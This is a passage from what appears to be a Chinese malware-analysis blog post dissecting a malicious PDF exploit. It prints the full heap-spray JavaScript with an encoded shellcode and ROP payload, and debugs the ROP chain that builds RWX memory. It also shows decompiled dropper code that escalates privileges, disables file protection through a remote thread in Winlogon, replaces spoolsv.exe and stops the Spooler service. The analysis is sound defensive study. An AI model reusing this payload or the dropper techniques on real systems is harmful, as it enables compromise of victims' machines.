src="http://imgsrc.baidu.com/forum/pic/item/7aec54e736d12f2e9b8a80aa0ac2d56284356868.jpg"></p><p>此时再将<code>CreateFileMappingA</code>的函数地址弹到eax，然后步入可以发现是直接执行eax保存的函数地址</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/b3b7d0a20cf431add9396df30e36acaf2fdd9814.jpg"></p><p>内部执行情况单步步入之后如下，并且可以发现其中的栈上的函数参数,其中第一个参数就是我们刚刚的文件句柄，第三个参数就是传递的保护措施，可以看到也是可执行可读可写的，因此我们就可以传递shellcode复制到此处执行</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/c2fdfc039245d688bae39c6ee1c27d1ed31b2412.jpg"></p><p>执行完毕我们使用ctrl + F9,再次跳转到结尾，发现同之前一样，交换eax和edi，也就是我们创建文件映射的句柄给到了edi</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/2f738bd4b31c870112789c2c627f9e2f0608ff2a.jpg"></p><p>然后同之前上面一样的操作，通过布置好的ROP链来执行<code>MapViewOfFile</code>，我直接掠过这里调试，跟上面两个函数一样，没什么好说的</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/4610b912c8fcc3ceaaf8e0f9d745d688d43f203b.jpg"></p><p>可以看到上面图片中调用<code>MapViewOfFile</code>函数的参数，调用该函数后，会返回该文件对象在内存当中对应的地址<br>该函数返回后如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/dbb44aed2e738bd403059bfbe48b87d6267ff9d0.jpg"></p><p>其中eax即为我们文件对象在内存中的地址为0x048D0000 </p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d50735fae6cd7b891d6813494a2442a7d8330ef7.jpg"></p><p>可以看到这块映射区RWE权限均有</p><p>然后我们之后的调试就会将文件内存地址存放在0x4A8A004的地址了，如下图</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/37d12f2eb9389b506c8bc998c035e5dde6116e87.jpg"></p><p>之后调试我们会在retn的地址存放该0x48D0000,方便我们ROP链返回<br>之后我们以同样的手段执行memcpy函数</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/342ac65c10385343fa88aeebd613b07ecb8088b0.jpg"></p><p>可以看到其中目的地址是0x048D0000,而我们的0x0c0c0D54存放着我们的恶意代码</p><p>我们使用ctrl + F9来跳到执行函数结束，如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/09fa513d269759eeefe94901f7fb43166c22dfbb.jpg"></p><p>可以看到文件对象的内存地址处已经拷贝过去了大量恶意代码，并且retn那儿我们是直接返回到0x048D00这里，也就是这个文件处执行，而因为我们这个文件有RWX权限，所以说咱们可以执行该文件恶意代码。</p><p>因此从ROP链到执行恶意代码，我们分为以下几个步骤：</p><ol><li>利用溢出来构造ROP链，ROP链通过布置不带ALSR的库中gadget来绕过此机制，通过两次栈迁移来到达0x0C0C0C0C,我们通过堆喷在这里构造好栈数据和恶意代码</li><li>调用CreateFileA函数，创建ios88591这个文件</li><li>调用CreateFileMappingA函数，构造该文件在内存中的映射</li><li>调用MapviewOfFile函数，返回该文件映射在内存中的地址，上面三部是为了构造一块可执行可读可写的内存区域</li><li>调用memcpy,来将恶意代码存放到该文件映射当中</li><li>跳转到恶意代码执行</li></ol><h2 id="6-堆喷-Heap-Spray"><a href="#6-堆喷-Heap-Spray" class="headerlink" title="6.堆喷(Heap Spray)"></a>6.堆喷(Heap Spray)</h2><p>我们利用pdf中内嵌的javascript来申请，首先申请个200MB的内存，而我们一般分配内存都是从低地址开始分配，因此大概率0x0c0c0c0c会被包含在其中，而我们这里一般会在前面的部分大量填充0x90，表示NOP指令，也就是雪橇，如果我们ROP到0x0c0c0c0c，就会通过该雪橇滑向我们布置的ROP链上</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/0df431adcbef760958c9b0556bdda3cc7dd99e3d.jpg"></p><p>我们可以通过PdfStreamDumper来解析pdf文件，从中提取出我们的JavaScript代码，如下：</p><pre><code class="hljs">var shellcode = unescape(&quot;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000&quot; +&quot;\x25\x7530e8\x25\x750000\x25\x75ad00\x25\x757d9b\x25\x75acdf\x25\x75da08\x25\x751676\x25\x75fa65&quot; +&quot;%uec10%u0397%ufb0c%ufd97%u330f%u8aca%uea5b%u8a49&quot; +&quot;%ud9e8%u238a%u98e9%u8afe%u700e%uef73%uf636%ub922&quot; +&quot;%u7e7c%ue2d8%u5b73%u8955%u81e5%u48ec%u0002%u8900&quot; +&quot;%ufc5d%u306a%u6459%u018b%u408b%u8b0c%u1c70%u8bad&quot; +&quot;%u0858%u0c6a%u8b59%ufc7d%u5351%u74ff%ufc8f%u8de8&quot; +&quot;%u0002%u5900%u4489%ufc8f%ueee2%u016a%u8d5e%uf445&quot; +&quot;%u5650%u078b%ud0ff%u4589%u3df0%uffff%uffff%u0475&quot; +&quot;%u5646%ue8eb%u003d%u0020%u7700%u4604%ueb56%u6add&quot; +&quot;%u6a00%u6800%u1200%u0000%u8b56%u0447%ud0ff%u006a&quot; +&quot;%u458d%u50ec%u086a%u458d%u50b8%u8b56%u0847%ud0ff&quot; +&quot;%uc085%u0475%u5646%ub4eb%u7d81%u50b8%u5064%u7444&quot; +&quot;%u4604%ueb56%u81a7%ubc7d%ufeef%uaeea%u0474%u5646&quot; +&quot;%u9aeb%u75ff%u6af0%uff40%u0c57%u4589%u85d8%u75c0&quot; +&quot;%ue905%u0205%u0000%u006a%u006a%u006a%uff56%u0457&quot; +&quot;%u006a%u458d%u50ec%u75ff%ufff0%ud875%uff56%u0857&quot; +&quot;%uc085%u0575%ue2e9%u0001%u5600%u57ff%u8b10%ud85d&quot; +&quot;%u838b%u1210%u0000%u4589%u8be8%u1483%u0012%u8900&quot; +&quot;%ue445%u838b%u1218%u0000%u4589%u03e0%ue445%u4503&quot; +&quot;%u89e8%udc45%u8a48%u0394%u121c%u0000%uc230%u9488&quot; +&quot;%u1c03%u0012%u8500%u77c0%u8deb%ub885%ufffe%u50ff&quot; +&quot;%uf868%u0000%uff00%u1457%ubb8d%u121c%u0000%uc981&quot; +&quot;%uffff%uffff%uc031%uaef2%ud1f7%ucf29%ufe89%uca89&quot; +&quot;%ubd8d%ufeb8%uffff%uc981%uffff%uffff%uaef2%u894f&quot; +&quot;%uf3d1%u6aa4%u8d02%ub885%ufffe%u50ff%u7d8b%ufffc&quot; +&quot;%u1857%uff3d%uffff%u75ff%ue905%u014d%u0000%u4589&quot; +&quot;%u89c8%uffc2%ue875%u838d%u121c%u0000%u4503%u50e0&quot; +&quot;%ub952%u0100%u0000%u548a%ufe48%u748a%uff48%u7488&quot; +&quot;%ufe48%u5488%uff48%ueee2%u57ff%uff1c%uc875%u57ff&quot; +&quot;%u8d10%ub885%ufffe%ue8ff%u0000%u0000%u0481%u1024&quot; +&quot;%u0000%u6a00%u5000%u77ff%uff24%u2067%u57ff%u8924&quot; +&quot;%ud045%uc689%uc789%uc981%uffff%uffff%uc031%uaef2&quot; +&quot;%ud1f7%u8949%ucc4d%ubd8d%ufeb8%uffff%u0488%u490f&quot; +&quot;%u048a%u3c0e%u7522%u491f%u048a%u3c0e%u7422%u8807&quot; +&quot;%u0f44%u4901%uf2eb%ucf01%uc781%u0002%u0000%u7d89&quot; +&quot;%ue9c0%u0013%u0000%u048a%u3c0e%u7420%u8806%u0f04&quot; +&quot;%ueb49%u01f3%u47cf%u7d89%uffc0%uf075%u406a%u558b&quot; +&quot;%ufffc%u0c52%u4589%u89d4%u8bc7%ue875%u7503%u01e0&quot; +&quot;%u81de%u1cc6%u0012%u8b00%ue44d%ua4f3%u7d8b%u6afc&quot; +&quot;%uff00%uc075%u57ff%u8918%uc445%uff3d%uffff%u74ff&quot; +&quot;%u576a%uc389%u75ff%ufff0%ud475%uff50%u1c57%uff53&quot; +&quot;%u1057%u7d8b%u81c0%uffc9%uffff%u31ff%uf2c0%uf7ae&quot; +&quot;%u29d1%u89cf%u8dfe%ub8bd%ufffd%uc7ff%u6307%u646d&quot; +&quot;%uc72e%u0447%u7865%u2065%u47c7%u2f08%u2063%u8122&quot; +&quot;%u0cc7%u0000%uf300%u4fa4%u07c6%u4722%u07c6%u5f00&quot; +&quot;\x25\x75858d\x25\x75fdb8\x25\x75ffff\x25\x7500e8\x25\x750000\x25\x758100\x25\x752404\x25\x750010&quot; +&quot;%u0000%u006a%uff50%u2477%u67ff%u6a20%uff00%u2c57&quot; +&quot;%u5553%u5756%u6c8b%u1824%u458b%u8b3c%u0554%u0178&quot; +&quot;%u8bea%u184a%u5a8b%u0120%ue3eb%u4932%u348b%u018b&quot; +&quot;%u31ee%ufcff%uc031%u38ac%u74e0%uc107%u0dcf%uc701&quot; +&quot;%uf2eb%u7c3b%u1424%ue175%u5a8b%u0124%u66eb%u0c8b&quot; +&quot;%u8b4b%u1c5a%ueb01%u048b%u018b%uebe8%u3102%u89c0&quot; +&quot;%u5fea%u5d5e%uc25b%u0008&quot;);// unescape(&quot;%u0c0c%u0c0c&quot;); 滑块代码 0x0c 等于指令 OR al, 0C; 大量执行对 shellcode 无影响var nop_chip = unescape(&quot;\x25\x750c0c\x25\x750c0c&quot;);// 65536 等于 0x10000 等于 2 ^ 16 等于 64KB, 这里的 20+8 应该是用来免杀用的，无实际作用while (nop_chip.length + 20 + 8 &lt; 65536)    nop_chip += nop_chip;// 精准堆喷，使 shellcode 开始的地方一定在 0c0c 结尾的地址 0x....0c0c 处temp_chip = nop_chip.substring(0, (0x0c0c - 0x24) / 2);temp_chip += shellcode; //拼接上 shellcode，该位置一定在 0c0c 结尾的地址处temp_chip += nop_chip; //拼接后续的滑块代码 // shellcode 小片段一个是 0x10000 大小，unicode 一个长度等于2字节，0x10000实际是 0x20000 字节大小，除2 为 0x10000small_shellcode_slide = temp_chip.substring(0, 65536 / 2);// 最终一个shellcode实际大小为 1MB，0x80000 * 2 = 0x100000 = 1MBwhile (small_shellcode_slide.length &lt; 0x80000)    small_shellcode_slide += small_shellcode_slide;// 从后面截短 0x1020 - 0x08 = 4120 字节，目的应该是让实际大小小于1MB，因为这里分配的一个堆块是1MB大小，shellcode_slide 应该小于堆块大小shellcode_slide = small_shellcode_slide.substring(0, 0x80000 - (0x1020 - 0x08) / 2);var slide = new Array();// 0x1f0 等于 496 ，也就是在内存中申请了接近 500 MB 的内存for (i = 0; i &lt; 0x1f0; i++)     slide[i] = shellcode_slide + &quot;s&quot;;// s 字符无实际作用，估计用于免杀</code></pre><p>可以看到上面代码首先是构造一个链条</p><pre><code class="hljs">var nop_chip = unescape(&quot;\x25\x750c0c\x25\x750c0c&quot;);// 65536 等于 0x10000 等于 2 ^ 16 等于 64KB, 这里的 20+8 应该是用来免杀用的，无实际作用while (nop_chip.length + 20 + 8 &lt; 65536)    nop_chip += nop_chip;</code></pre><p>上述代码可以近似看作拼接大量<code>nop</code>指令，然后我们精准堆喷，这里我们截取一下我们的构造链条，使得我们的shellcode能被存放在0x****0c0c,这里减去0x24，是因为堆头部会占据0x20字节，然后shellcode首部我们添加了4个‘A’</p><pre><code class="hljs">// 精准堆喷，使 shellcode 开始的地方一定在 0c0c 结尾的地址 0x....0c0c 处temp_chip = nop_chip.substring(0, (0x0c0c - 0x24) / 2);temp_chip += shellcode; //拼接上 shellcode，该位置一定在 0c0c 结尾的地址处</code></pre><p>然后我们将shellcode小片填充1MB大小，然后往我们准备的数组中不断填充数据，直到我们填满500的话就差不多用了500MB了</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/472309f790529822ae6a110992ca7bcb0b46d49b.jpg"></p><p>可以看到我们目前啥东西没开但是已经用了700M是哪儿来的了</p><h2 id="7-恶意样本分析"><a href="#7-恶意样本分析" class="headerlink" title="7.恶意样本分析"></a>7.恶意样本分析</h2><p>我们已经完成了样本分析过程，接下来我们来看看恶意代码的调试分析，首先是我们的调试界面，这里之前我们使用的分析样本是简单的执行一个计算器的打印，但是这里我们直接拿真正的恶意样本来进行分析，他名字是一个名企面试自助手册</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/0b55b319ebc4b745d9899cdc8afc1e178b8215de.jpg"></p><p>此时我们像之前漏洞分析一样直接运行到恶意代码处，这里是call了一个值，我们步入查看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/48540923dd54564ed271cff3f6de9c82d0584fe7.jpg"></p><p>恶意代码会从 kernel32.dll 中获取想要调用的函数地址。首先获取了 kernel32.dll 的基地址，0x4930044 处先赋值 ecx 为 0x30 ，fs[0x30] 处即为进程环境块 PEB 的指针，通过 PEB + 0xC 偏移处获取<br>PEB_LDR_DATA 结构体指针，PEB_LDR_DATA 偏移 0x1C 处获取<br><code>InInitializationOrderModuleList</code>成员指针，lods [esi] 获取双向链表当前节点的后继指针, 指向 kernel32.dll 节点，找到属于kernel32.dll的结点后，在其基础上再偏移0x08就是kernel32.dll在内存中的加载基地址。获取加载基地址为 0x7C800000 ，保存在 ebx 中，如下图：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/4034970a304e251fc182cf32e286c9177e3e5386.jpg"></p><p>而上图中即将压入栈的0xC是我们即将寻找的函数数量，而我们上图中会运行到一个call函数，步入如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/738b4710b912c8fca5afdd07b9039245d788219f.jpg"></p><p>栈上第一个参数是第一个函数的hash，第二个为kernel32.dll的基地址，然后我们0x49302f8地址指令会将该基地址偏移0x3c的值赋给eax，这个0x3c是PE头部偏移量的存储位置，然后在PE头部偏移0x78处，也就是我们kernel32.dll导出表的虚拟地址0x262c赋值给edx，如下</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/1c950a7b02087bf4ca527c23b7d3572c10dfcfba.jpg"></p><p>此时我们的edx是存放着kernel32.dll导出表的虚拟地址的，此时我们再将偏移0x18和0x20的值分别存放在ecx和ebx中，这里的偏移分别保存着导出表函数的数目和导出表函数名称表的地址偏移</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/6a63f6246b600c3361d7f5025f4c510fd8f9a14a.jpg"></p><p>然后我们继续单步，发现在0x493030F,这里，我们是将函数表中最后一个函数名称地址放入esi</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/7a899e510fb30f24c604c7c98d95d143ac4b0359.jpg"></p><p>可以看到我们上面放入esi的函数名是<code>IstrenW</code>,然后我们在0x493031B处根据函数名计算hash，然后同之前我们压栈的hash([esp + 0x14])进行比较，若相同则继续往下走</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/fcfaaf51f3deb48fa3fb8a14b51f3a292cf5786d.jpg"></p><p>然后我们在cmp那里下一个条件断点，免得我们一直循环，我们选择conditional这条，然后条件写<code>esp == [esp+ 0x14]</code>,然后F9</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d6ca7bcb0a46f21f5fc47599b3246b600d33ae0c.jpg"></p><p>可以看到专门存放函数名的esi，此时是<code>ExitThread</code>，说明我们要寻找的函数就是他</p><ol><li>先在导出表偏移 0x24 处获取输出序号数组的地址</li><li>通过输出序号数组获取 ExitThread 函数的序号，其中 ECX 就是序号</li><li>获取函数地址数组</li><li>根据序号在函数地址数组中找到 ExitThread 函数的地址，保存在 eax 中，可以看到下图此时 eax 已经指ExitProcess 函数，猜测在实际中，ExitThread 函数即为 ExitProcess 函数</li></ol><p><img src="http://imgsrc.baidu.com/forum/pic/item/d62a6059252dd42ac7d72a61463b5bb5c8eab81a.jpg"></p><p>然后我们执行到这里会将其存放在[edi+ecx*4-0x4],</p><pre><code class="hljs">04930063    59              pop ecx04930064    89448F FC       mov dword ptr ds:[edi+ecx*4-0x4],eax   ; kernel32.ExitProcess04930068  ^ E2 EE           loopd short 04930058</code></pre><p>接下来接着循环，此时的ecx存放着我们想要解析的函数数目，这里可以看到我们是将eax指向的函数指针保存在内存中某个位置，我们同样在此处下一个条件断点，条件为<code>ecx == 1</code>,然后F9，此时执行完毕会发现对应内存填充了我们的函数地址</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d8f9d72a6059252d393237ce719b033b5ab5b9d7.jpg"></p><p>然后我们调用GetFileSize函数，若发现其大于，此处会一直遍历所有 handler 并获取文件大小，比较是否大于 0x2000，如果大于则跳转到 0x493008F。我们在此处下个断点，然后运行查看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/6159252dd42a2834dbd41cc11eb5c9ea14cebf8e.jpg"></p><p>大伙这里出了个问题，就是之前用计算器简单脚本所执行的iso88591没清理干净，导致运行始终不如意，这里我恢复虚拟机快照后重新编译了一遍，此时其他的基本没变，只是我们恶意代码的基地址变了一下，抱歉。</p><p>然后这里底下才是正确的返回值</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/2fdda3cc7cd98d10172926fb643fb80e7aec907e.jpg"></p><p>可以看到我们目前esi指向的句柄为0x310，指向的eax为文件大小，为0x1CAD74，然后我们可以点击上面的H来查看一下内存中存在的句柄，可以发现恰好就是咱们的恶意文件pdf</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/21a4462309f7905241e96df449f3d7ca7acbd502.jpg"></p><p>接下来我们会调用函数<code>SetFRilePointer</code>，将函数指针偏移到文件0x1200的位置，这里就不逐步查看了，我们直接往下走，之后我们会调用<code>ReadFile</code>函数，读取该位置8字节到栈上0x0c0c0cFc</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/c995d143ad4bd113fa129df81fafa40f4afb0518.jpg"></p><p>之后我们会检查一下几点固定值，若相等，则确定为恶意文件本身，然后我们调用<code>GlobalAlloc</code>函数，从堆中分配一定的字节，然后填充0，大小为我们之前获得的那个值，然后我们分配好空间后，再次调用<code>readFile</code>将恶意pdf读入内存中</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/35a85edf8db1cb1372a616d99854564e93584b28.jpg"></p><p>读出来后，使用异或解密 PDF 中的一个 stream 流对象</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/faedab64034f78f066308f393c310a55b2191cc4.jpg"></p><p>解密后可以看到标红这里有一个svrhost.exe字符串，他被拼接到右边栈0x0c0c0B40的临时目录地址上，然后我们调用<code>lcreate</code>函数来创建该临时文件，如下</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/b64543a98226cffc853caa78fc014a90f703eae2.jpg"></p><p>我们直接步过，然后到相应文件夹下查看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/37d12f2eb9389b5050faf598c035e5dde6116ef6.jpg"></p><p>可以看到确实有这个文件了，然后我们交换前0x200个字节，使前 200 字节恢复成正常的 PE 文件格式，然后调用 lwrite 函数把解密后的 PE 文件写进 svrhost.exe 中</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/2934349b033b5bb538ba353473d3d539b700bc8f.jpg"></p><p>再然后我们调用<code>WinExec</code>函数进行执行该可执行文件，我们将他复制一份到IDA中打开</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/f7246b600c33874409eb39b6140fd9f9d62aa0ca.jpg"></p><p>IDA反编译得到下面main函数</p><pre><code class="hljs">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char *v3; // edi  char *v5; // edi  char *v7; // edi  HANDLE FileA; // eax  int v10; // eax  HANDLE v12; // eax  int v13; // eax  void (__stdcall *v14)(LPCSTR, LPCSTR, DWORD); // edi  CHAR CmdLine[1021]; // [esp+18h] [ebp-728h] BYREF  __int16 v16; // [esp+415h] [ebp-32Bh]  char v17; // [esp+417h] [ebp-329h]  CHAR Filename[257]; // [esp+418h] [ebp-328h] BYREF  __int16 v19; // [esp+519h] [ebp-227h]  char v20; // [esp+51Bh] [ebp-225h] BYREF  CHAR v21[257]; // [esp+51Ch] [ebp-224h] BYREF  __int16 v22; // [esp+61Dh] [ebp-123h]  char v23; // [esp+61Fh] [ebp-121h] BYREF  CHAR Buffer[257]; // [esp+620h] [ebp-120h] BYREF  __int16 v25; // [esp+721h] [ebp-1Fh]  char v26; // [esp+723h] [ebp-1Dh]  CPPEH_RECORD ms_exc; // [esp+728h] [ebp-18h]  memset(Buffer, 0, sizeof(Buffer));  v25 = 0;  v26 = 0;  GetSystemDirectoryA(Buffer, 0x104u);  v3 = &amp;v23;  while ( *++v3 )    ;  strcpy(v3, &quot;\\setup\\&quot;);  v5 = &amp;v23;  while ( *++v5 )    ;  strcpy(v5, &quot;hid128.log&quot;);  memset(v21, 0, sizeof(v21));  v22 = 0;  v23 = 0;  GetSystemDirectoryA(v21, 0x104u);  v7 = &amp;v20;  while ( *++v7 )    ;  strcpy(v7, &quot;\\cmd.exe&quot;);  memset(CmdLine, 0, sizeof(CmdLine));  v16 = 0;  v17 = 0;  sprintf(CmdLine, &quot;%s /c echo 12345&gt;%s&quot;, v21, Buffer);// 格式化输出                                                // C:\WINDOWS\system32\cmd.exe /c echo 12345&gt;C:\WINDOWS\system32\setup\hid128.log  WinExec(CmdLine, 0);  Sleep(0xBB8u);  FileA = CreateFileA(Buffer, 0x80000000, 1u, 0, 3u, 0x10000080u, 0);  if ( FileA == (HANDLE)-1 )  &#123;    v10 = 0;  &#125;  else  &#123;    CloseHandle(FileA);    v10 = 1;  &#125;  if ( v10 )    sub_402180();                               // 关闭文件保护函数  memset(Filename, 0, sizeof(Filename));  v19 = 0;  v20 = 0;  GetModuleFileNameA(0, Filename, 0x104u);  if ( !sub_402210(Filename) )  &#123;    sub_40321D(&quot;Not configed, exit...\r\n&quot;);    return -1;  &#125;  v12 = CreateFileA(Buffer, 0x80000000, 1u, 0, 3u, 0x10000080u, 0);  if ( v12 == (HANDLE)-1 )  &#123;    v13 = 0;  &#125;  else  &#123;    CloseHandle(v12);    v13 = 1;  &#125;  if ( !v13 )    return -1;  GetSystemDirectoryA(::Buffer, 0x104u);  *(_WORD *)&amp;::Buffer[strlen(::Buffer)] = 92;  strcat(::Buffer, &quot;spoolss.dll&quot;);  GetSystemDirectoryA(byte_4127E8, 0x104u);  *(_WORD *)&amp;byte_4127E8[strlen(byte_4127E8)] = 92;  GetSystemDirectoryA(byte_4128F0, 0x104u);  strcat(byte_4128F0, &quot;\\Setup\\&quot;);  GetSystemDirectoryA(byte_4129F8, 0x104u);  strcat(byte_4129F8, &quot;\\catroot\\&quot;);  strcat(ExistingFileName, byte_4127E8);  strcat(ExistingFileName, aSpoolsvExe);  strcat(byte_412C08, byte_4127E8);  strcat(byte_412C08, aSpoolerExe);  strcat(byte_412D10, byte_4128F0);  strcat(byte_412D10, aSetjupryExe);  strcat(NewFileName, byte_4128F0);  strcat(NewFileName, aFxjssocmExe);  strcat(byte_412F20, byte_4127E8);  strcat(byte_412F20, aMsxml0rDll);  strcat(FileName, byte_4127E8);  strcat(FileName, aMsxml0Dll);  strcat(byte_413130, byte_4128F0);  strcat(byte_413130, aMsxm32Dll);  ms_exc.registration.TryLevel = 0;  sub_401FA0(ServiceName);  dword_413234 = sub_401A00(byte_413130);  if ( dword_413234 )  &#123;    v14 = (void (__stdcall *)(LPCSTR, LPCSTR, DWORD))MoveFileExA;    MoveFileExA(ExistingFileName, byte_412C08, 3u);    CopyFileA(NewFileName, ExistingFileName, 0);    if ( sub_401000(ExistingFileName, (int)aMsxml0rDll, (int)aEntrypoint) == 1 )      sub_40321D(&quot;Install Again Successfully!\r\n&quot;);    else      sub_40321D(&quot;Install Again Failed!\r\n&quot;);    sub_401CE0(ExistingFileName, ::Buffer);  &#125;  else  &#123;    CopyFileA(ExistingFileName, NewFileName, 0);    v14 = (void (__stdcall *)(LPCSTR, LPCSTR, DWORD))MoveFileExA;    MoveFileExA(ExistingFileName, byte_412C08, 3u);    CopyFileA(NewFileName, ExistingFileName, 0);    if ( sub_401000(ExistingFileName, (int)aMsxml0rDll, (int)aEntrypoint) == 1 )      sub_40321D(&quot;New Install Successfully!\r\n&quot;);    else      sub_40321D(&quot;New Install Failed!\r\n&quot;);    CopyFileA(ExistingFileName, byte_412D10, 0);    CopyFileA(::Buffer, byte_413130, 0);    sub_401D70(byte_4128F0, byte_4129F8);    sub_401CE0(ExistingFileName, ::Buffer);  &#125;  sub_401AD0(ServiceName);  if ( sub_401A00(byte_412F20) )  &#123;    if ( sub_401A00(FileName) )      DeleteFileA(FileName);    v14(byte_412F20, FileName, 3u);    sub_402110(byte_412F20, &amp;unk_40B148, 0x6E00u);    sub_4023F0(byte_412F20);    if ( sub_401CE0(byte_412F20, ::Buffer) )      sub_40321D(&quot;Upgrade Success!\r\n&quot;);    else      sub_40321D(&quot;Upgrade Failed!\r\n&quot;);  &#125;  else  &#123;    sub_402110(byte_412F20, &amp;unk_40B148, 0x6E00u);    sub_4023F0(byte_412F20);    sub_401CE0(byte_412F20, ::Buffer);    sub_401CE0(ExistingFileName, ::Buffer);  &#125;  ms_exc.registration.TryLevel = -1;  sub_401E20(ServiceName);  sub_401B70(4205738);  return 1;&#125;</code></pre><p>可以看到该函数首先是创建了一个log文件，然后输出12345到其中，之后我们进入注释的关闭文件保护函数，点击查看</p><pre><code class="hljs">int __thiscall sub_402180(void *this)&#123;  HMODULE v1; // esi  unsigned __int16 Version; // ax  __int16 v3; // ax  HMODULE LibraryA; // eax  DWORD (__stdcall *ProcAddress)(LPVOID); // esi  void *v6; // eax  HANDLE v7; // eax  DWORD ThreadId; // [esp+0h] [ebp-4h] BYREF  ThreadId = (DWORD)this;  sub_4016F0();                                 // 提权函数，启用SeDebugPreviledge  sub_401780(&quot;Winlogon.exe&quot;);  v1 = 0;  Version = GetVersion();  if ( (_BYTE)Version == 5 )  &#123;    v3 = HIBYTE(Version);    if ( !(_BYTE)v3 )    &#123;      LibraryA = LoadLibraryA(&quot;sfc.dll&quot;);LABEL_7:      v1 = LibraryA;      goto LABEL_8;    &#125;    if ( (_BYTE)v3 == 1 || (_BYTE)v3 == 2 )    &#123;      LibraryA = LoadLibraryA(&quot;sfc_os.dll&quot;);      goto LABEL_7;    &#125;  &#125;LABEL_8:  ProcAddress = (DWORD (__stdcall *)(LPVOID))GetProcAddress(v1, (LPCSTR)2);  ThreadId = 0;  v6 = (void *)sub_4018B0(&quot;Winlogon.exe&quot;);  v7 = CreateRemoteThread(v6, 0, 0, ProcAddress, 0, 0, &amp;ThreadId);  WaitForSingleObject(v7, 0xFA0u);  return 0;&#125;</code></pre><p>其中函数<code>sub_4016F0()</code>是一个典型的提权函数，他的名字应该是<code>ElvatePriviledge</code>,他的作用是获取 SeDebugPrivilege 权限并设置 SE_PRIVILEGE_ENABLED 属性来开启权限，这里没符号表很难受,跟进查看如下</p><pre><code class="hljs">int sub_4016F0()&#123;  HANDLE CurrentProcess; // eax  HANDLE TokenHandle; // [esp+0h] [ebp-1Ch] BYREF  struct _LUID Luid; // [esp+4h] [ebp-18h] BYREF  struct _TOKEN_PRIVILEGES NewState; // [esp+Ch] [ebp-10h] BYREF  CurrentProcess = GetCurrentProcess();  if ( !OpenProcessToken(CurrentProcess, 0x28u, &amp;TokenHandle) )    return 0;  if ( !LookupPrivilegeValueA(0, &quot;SeDebugPrivilege&quot;, &amp;Luid) )  &#123;    CloseHandle(TokenHandle);    return 0;  &#125;  NewState.Privileges[0].Luid = Luid;  NewState.PrivilegeCount = 1;  NewState.Privileges[0].Attributes = 2;  AdjustTokenPrivileges(TokenHandle, 0, &amp;NewState, 0x10u, 0, 0);  CloseHandle(TokenHandle);  return 1;&#125;</code></pre><p>然后回到主函数，该函数会串讲停止打印服务脚本并且运行,这里会有一个字符串<code>Spooler</code></p><p><img src="http://imgsrc.baidu.com/forum/pic/item/86d6277f9e2f070884b338caac24b899a801f242.jpg"></p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d4628535e5dde7118d62513ce2efce1b9c166143.jpg"></p><p>，我们用OD进行动态调试</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8d5494eef01f3a2904b4c804dc25bc315d607cff.jpg"></p><p>我们跟进查看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/adaf2edda3cc7cd9815f29137c01213fb90e918d.jpg"></p><p>可以看到他会创建一个Temp_unstop.bat,然后我们写入内容</p><pre><code class="hljs">net stop &quot;Spooler&quot;net stop &quot;Spooler&quot;del &quot;C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\_unstop.bat&quot;</code></pre><p>他是为了关闭Spooler服务，然后删除自己。</p><pre><code class="hljs">void __cdecl sub_401FA0(const char *a1)&#123;  char *v1; // edi  HANDLE FileA; // esi  DWORD NumberOfBytesWritten; // [esp+14h] [ebp-61Ch] BYREF  CHAR 